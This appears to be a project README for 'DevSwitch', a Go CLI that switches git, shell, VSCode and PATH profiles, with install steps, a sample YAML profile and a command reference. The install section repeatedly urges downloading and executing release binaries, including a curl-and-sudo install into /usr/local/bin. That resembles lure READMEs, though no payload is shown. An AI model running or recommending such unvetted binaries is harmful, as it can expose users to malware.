# DevSwitch — Fast Cross-Platform Developer Environment Switcher
[![Releases](https://img.shields.io/github/v/release/mamutijebem334/devswitch?label=Releases&logo=github&color=2b9348)](https://github.com/mamutijebem334/devswitch/releases)

A single CLI to switch developer environments across macOS, Linux, and Windows. Manage git configs, shell profiles, VSCode settings, PATH entries, and other dotfiles from named profiles. Work with local dotfiles or a central store. Move between projects and machines with one command.

[![CLI](https://img.shields.io/badge/cli-ready-blue)](https://github.com/mamutijebem334/devswitch/releases) [![Cross-Platform](https://img.shields.io/badge/platform-macOS%20|%20Linux%20|%20Windows-lightgrey)]() [![Go](https://img.shields.io/badge/language-Go-brightgreen?logo=go)]()

![devswitch-banner](https://raw.githubusercontent.com/github/explore/main/topics/terminal/terminal.png)

- Topics: cli, cross-platform, dev-environment, developer-tools, development, dotfiles, gitconfig, go, golang, productivity, shell, vscode, zshrc

Table of contents
- Features
- Why DevSwitch
- Install
- Quickstart
- Configuration
- Examples
- Integrations
- Advanced usage
- Troubleshooting
- Contributing
- License

Features
- Manage named profiles for environments (work, personal, project-x).
- Switch git user.name, user.email, and include per-repo overrides.
- Swap shell configs: zshrc, bashrc, fish, and PATH entries.
- Apply VSCode settings and extensions lists.
- Support for machine-level and project-level profiles.
- Cross-platform support: macOS, Linux, Windows (WSL supported).
- Small Go binary with no heavy runtime.

Why DevSwitch
- Keep environment changes versioned and repeatable.
- Avoid manual dotfile edits when switching contexts.
- Reuse profiles across machines.
- Scriptable and CI-friendly.

Install
1) Visit the releases page and download the binary asset that matches your OS and architecture. The file must be downloaded and executed. Use this link: https://github.com/mamutijebem334/devswitch/releases

2) Typical steps for macOS / Linux:
- Pick the release and download the matching asset (example name): devswitch_1.2.0_linux_amd64.tar.gz
- Extract and install:
  - tar -xzf devswitch_1.2.0_linux_amd64.tar.gz
  - chmod +x devswitch
  - sudo mv devswitch /usr/local/bin/

3) Typical steps for Windows:
- Download the .zip or .exe asset from the releases page.
- Unzip and place devswitch.exe on your PATH (e.g., C:\Tools\devswitch\).
- Run from PowerShell or CMD.

4) Install via curl (example pattern):
- curl -L -o devswitch.tar.gz "https://github.com/mamutijebem334/devswitch/releases/download/<tag>/devswitch_<tag>_$(uname -s)_amd64.tar.gz"
- tar -xzf devswitch.tar.gz
- sudo mv devswitch /usr/local/bin/

Quickstart
- List profiles:
  - devswitch list
- Use a profile:
  - devswitch use work
- Show active profile:
  - devswitch status
- Apply changes without switching:
  - devswitch apply --profile project-x

Configuration
DevSwitch uses a human-friendly YAML or JSON file per profile. Place profiles in a profiles/ directory or point to a repo of dotfiles.

Example profile (devswitch.yaml)
```yaml
name: work
git:
  user:
    name: "Alice Dev"
    email: "alice@company.com"
shell:
  dotfiles:
    - .zshrc
    - .profile
vscode:
  settings:
    "editor.tabSize": 2
  extensions:
    - ms-python.python
    - esbenp.prettier-vscode
env:
  PATH_add:
    - /usr/local/go/bin
  VARS:
    GIT_AUTHOR_NAME: "Alice Dev"
hooks:
  post:
    - command: git config --global core.editor "code --wait"
```

Profile store
- Local folder: ~/.devswitch/profiles/
- Repo-backed: clone a dotfiles repo and set it as the profile store:
  - devswitch store set git@github.com:you/dotfiles.git

Examples
Switch git identity
- devswitch use personal
- devswitch use work

Switch shell config
- devswitch use heavy-cli
- The tool will:
  - backup current files
  - symlink or copy the profile dotfiles
  - reload the shell where supported

Apply VSCode settings and extensions
- devswitch use frontend
- The CLI writes settings.json and installs listed extensions.

Per-repo overrides
- Place devswitch.yaml in a repo root.
- Run:
  - devswitch apply --local
- DevSwitch will apply repo-specific config.

Integrations
- git: modify global and local config, include templates.
- shell: zsh, bash, fish. Support for sourcing and reload hooks.
- VSCode: settings.json and code --install-extension.
- tmux: load per-profile tmux.conf.
- direnv: update .envrc per profile.
- Go: add GOPATH, GOBIN to PATH and set goenv variables.

Advanced usage
- Scripting
  - Use devswitch in CI:
    - devswitch apply --profile ci
- Dry run:
  - devswitch apply --profile work --dry-run
- Backup and restore
  - devswitch backup --out ~/devswitch-backup.tar.gz
  - devswitch restore --in ~/devswitch-backup.tar.gz
- Diff
  - devswitch diff --profile work --target current

Commands reference
- devswitch list
- devswitch use <profile> [--local|--global]
- devswitch apply --profile <profile>
- devswitch status
- devswitch backup --out <file>
- devswitch restore --in <file>
- devswitch store set <git-url|path>
- devswitch version
- devswitch help <command>

Examples of real workflows
- Switch from office to side-project:
  - devswitch use office
  - devswitch use side-project
- Sandboxed test environment:
  - devswitch use testenv --dry-run
  - devswitch apply --profile testenv

Troubleshooting
- If a file conflicts, DevSwitch creates a .bak and prints the file path.
- If an external tool is missing, the CLI reports the missing tool and suggests installation steps.
- If a profile fails to apply, inspect the log in ~/.devswitch/logs/.

Releases and downloads
- The releases page contains packaged binaries and assets. Download the asset that matches your OS and run the included binary or installer. Use the same link as above to find the right file: https://github.com/mamutijebem334/devswitch/releases

Security and backups
- DevSwitch creates backups before changing dotfiles.
- You control where profiles live. Use a private repo for secrets.
- Avoid committing secrets to public dotfiles.

Best practices
- Keep one profile per context.
- Use names that map to teams, projects, or roles.
- Keep scripts idempotent and small.
- Version your profile store.

Design notes
- We use simple, declarative profiles. The CLI prefers explicit mapping over magic.
- The binary stays small to avoid heavy dependencies.
- The tool favors copying or symlinking based on platform behavior.

Contributing
- Fork the repo.
- Create a feature branch.
- Add tests and documentation.
- Open a pull request with a clear description of the change.
- Run go fmt and go vet before submitting.

CI and tests
- Unit tests run on Linux, macOS, and Windows runners.
- The build produces platform artifacts for each release.

Roadmap
- Add plugin system for third-party modules.
- Add UI for profile previews.
- Add encrypted secrets manager for profile secrets.

FAQ
- Can I keep per-repo credentials?
  - Yes. Use local git config or environment vars in the repo-level devswitch.yaml.
- Does it change global files?
  - It changes files only when you run use/apply. It backs up originals.
- Can I script setup for new machines?
  - Yes. Clone your profile store and run devswitch apply --profile bootstrap.

Assets and images
- Terminal icon: https://raw.githubusercontent.com/github/explore/main/topics/terminal/terminal.png
- VSCode icon: https://raw.githubusercontent.com/github/explore/main/topics/visual-studio-code/visual-studio-code.png
- Use shields from img.shields.io for badges.

License
- MIT

Contact
- Use issues in the repository for bugs and feature requests.

Contribution etiquette
- Write clear commit messages.
- Keep changes scoped.
- Add tests for behavior changes.

End of file